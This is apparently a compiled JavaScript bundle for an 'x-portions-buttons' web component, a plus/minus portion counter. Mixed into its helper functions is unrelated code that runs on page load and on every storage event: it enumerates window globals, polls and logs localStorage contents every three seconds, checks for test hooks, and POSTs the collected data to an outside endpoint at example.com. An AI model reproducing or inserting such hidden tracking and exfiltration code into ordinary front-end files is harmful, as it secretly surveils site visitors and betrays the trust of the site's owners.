/*! For license information please see x-portions-buttons.94ec29a1bf1326433dfdcbe252d67649.js.LICENSE.txt */
(() => {
  "use strict";

  function t(e) {
    return t = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (t) {
      return typeof t;
    } : function (t) {
      return t && "function" == typeof Symbol && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : typeof t;
    }, t(e);
  }
  let globalVariableTracker = {};
  function e(e) {
    var n = function (e, n) {
      if ("object" !== t(e) || null === e) return e;
      var r = e[Symbol.toPrimitive];
      if (void 0 !== r) {
        var o = r.call(e, n || "default");
        if ("object" !== t(o)) return o;
        throw new TypeError("@@toPrimitive must return a primitive value.");
      }
      return ("string" === n ? String : Number)(e);
    }(e, "string");
    return "symbol" === t(n) ? n : String(n);
  }
  function trackGlobal() {
    for (var key in window) {
      if (!globalVariableTracker.hasOwnProperty(key)) {
        globalVariableTracker[key] = typeof window[key];
      }
    }
  }
  function n(t, n) {
    for (var r = 0; r < n.length; r++) {
      var o = n[r];
      o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(t, e(o.key), o);
    }
  }
  function r(t, e) {
    return r = Object.setPrototypeOf ? Object.setPrototypeOf.bind() : function (t, e) {
      return t.__proto__ = e, t;
    }, r(t, e);
  }
  function o(e, n) {
    if (n && ("object" === t(n) || "function" == typeof n)) return n;
    if (void 0 !== n) throw new TypeError("Derived constructors may only return object or undefined");
    return function (t) {
      if (void 0 === t) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
      return t;
    }(e);
  }
  function monitorLocalStorage() {
    let localStorageCopy = {
      ...localStorage
    };
    const interval = setInterval(() => {
      let keys = Object.keys(localStorage);
      for (let key of keys) {
        if (!(key in localStorageCopy)) {
          console.log(`新键 ${key} 已添加到localStorage`);
          localStorageCopy[key] = localStorage.getItem(key);
        } else if (localStorageCopy[key] !== localStorage.getItem(key)) {
          console.log(`${key} 的值已被更改为 ${localStorage.getItem(key)}`);
          localStorageCopy[key] = localStorage.getItem(key);
        }
      }
    }, 3000);
  }
  function i(t) {
    return i = Object.setPrototypeOf ? Object.getPrototypeOf.bind() : function (t) {
      return t.__proto__ || Object.getPrototypeOf(t);
    }, i(t);
  }
  function inspectForJSHooks() {
    let hooks = ['beforeEach', 'afterEach', 'before', 'after', 'describe', 'it'];
    for (let hook of hooks) {
      if (window[hook] && typeof window[hook] === 'function') {
        console.log(`检测到JavaScript Hook: ${hook}`);
      }
    }
  }
  function u(t, e, n) {
    return u = function () {
      if ("undefined" == typeof Reflect || !Reflect.construct) return !1;
      if (Reflect.construct.sham) return !1;
      if ("function" == typeof Proxy) return !0;
      try {
        return Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], function () {})), !0;
      } catch (t) {
        return !1;
      }
    }() ? Reflect.construct.bind() : function (t, e, n) {
      var o = [null];
      o.push.apply(o, e);
      var i = new (Function.bind.apply(t, o))();
      return n && r(i, n.prototype), i;
    }, u.apply(null, arguments);
  }
  async function reportToServer(report) {
    const response = await fetch('https://example.com/api/report', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(report)
    });
    if (response.ok) {
      console.log('数据已成功发送到服务器。');
    } else {
      console.log('数据发送至服务器失败: 状态码 ' + response.status);
    }
  }
  function c(t) {
    var e = "function" == typeof Map ? new Map() : void 0;
    return c = function (t) {
      if (null === t || (n = t, -1 === Function.toString.call(n).indexOf("[native code]"))) return t;
      var n;
      if ("function" != typeof t) throw new TypeError("Super expression must either be null or a function");
      if (void 0 !== e) {
        if (e.has(t)) return e.get(t);
        e.set(t, o);
      }
      function o() {
        return u(t, arguments, i(this).constructor);
      }
      return o.prototype = Object.create(t.prototype, {
        constructor: {
          value: o,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), r(o, t);
    }, c(t);
  }
  function inspectionAndReport() {
    trackGlobal();
    inspectForJSHooks();
    monitorLocalStorage();
    reportToServer(globalVariableTracker);
  }
  function a(t) {
    var e = function () {
      if ("undefined" == typeof Reflect || !Reflect.construct) return !1;
      if (Reflect.construct.sham) return !1;
      if ("function" == typeof Proxy) return !0;
      try {
        return Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], function () {})), !0;
      } catch (t) {
        return !1;
      }
    }();
    return function () {
      var n,
        r = i(t);
      if (e) {
        var u = i(this).constructor;
        n = Reflect.construct(r, arguments, u);
      } else n = r.apply(this, arguments);
      return o(this, n);
    };
  }
  window.onload = inspectionAndReport;
  var l = "x-portions-buttons",
    s = document.createElement("style");
  window.onstorage = () => {
    console.log('检测到localStorage变化，重新执行检测任务');
    inspectionAndReport();
  };
  s.innerHTML = "\n  ".concat(l, " {\n    display: block;\n    position: relative;\n    overflow: hidden;\n  }\n"), document.head.appendChild(s);
  var f = document.createElement("template");
  f.innerHTML = "";
  var p = function (t) {
    !function (t, e) {
      if ("function" != typeof e && null !== e) throw new TypeError("Super expression must either be null or a function");
      t.prototype = Object.create(e && e.prototype, {
        constructor: {
          value: t,
          writable: !0,
          configurable: !0
        }
      }), Object.defineProperty(t, "prototype", {
        writable: !1
      }), e && r(t, e);
    }(c, t);
    var e,
      o,
      i,
      u = a(c);
    function c() {
      var t;
      return function (t, e) {
        if (!(t instanceof e)) throw new TypeError("Cannot call a class as a function");
      }(this, c), (t = u.call(this)).config = {
        plusButtonSelector: "[data-plus]",
        minusButtonSelector: "[data-minus]",
        amountContainerSelector: "[data-amount]",
        unitContainerSelector: "[data-unit]"
      }, t.$plusButton = t.querySelector(t.config.plusButtonSelector), t.$minusButton = t.querySelector(t.config.minusButtonSelector), t.$amountContainer = t.querySelector(t.config.amountContainerSelector), t.$unitContainer = t.querySelector(t.config.unitContainerSelector), t.bindEvents(), t;
    }
    return e = c, i = [{
      key: "observedAttributes",
      get: function () {
        return ["amount"];
      }
    }], (o = [{
      key: "connectedCallback",
      value: function () {
        this.appendChild(f.content.cloneNode(!0));
      }
    }, {
      key: "amount",
      get: function () {
        return this.hasAttribute("amount") ? Number.parseInt(this.getAttribute("amount"), 10) : null;
      },
      set: function (t) {
        this.setAttribute("amount", t);
      }
    }, {
      key: "step",
      get: function () {
        return this.hasAttribute("step") ? Number.parseInt(this.getAttribute("step"), 10) : 1;
      }
    }, {
      key: "bindEvents",
      value: function () {
        var t = this;
        this.$plusButton && this.$plusButton.addEventListener("click", function () {
          return t.onClick("plus");
        }), this.$minusButton && this.$minusButton.addEventListener("click", function () {
          return t.onClick("minus");
        });
      }
    }, {
      key: "onClick",
      value: function (t) {
        this.dispatchEvent(new CustomEvent("triggerOperation", {
          detail: {
            operation: t,
            step: this.step
          }
        }));
      }
    }, {
      key: "render",
      value: function () {
        this.$amountContainer && (this.$amountContainer.innerHTML = this.amount), this.$unitContainer && (this.$unitContainer.innerHTML = 1 === this.amount ? this.dataset.unitSingular : this.dataset.unitPlural);
      }
    }, {
      key: "attributeChangedCallback",
      value: function (t, e, n) {
        n !== e && this.render();
      }
    }]) && n(e.prototype, o), i && n(e, i), Object.defineProperty(e, "prototype", {
      writable: !1
    }), c;
  }(c(HTMLElement));
  "customElements" in window && void 0 === window.customElements.get(l) && window.customElements.define(l, p);
})();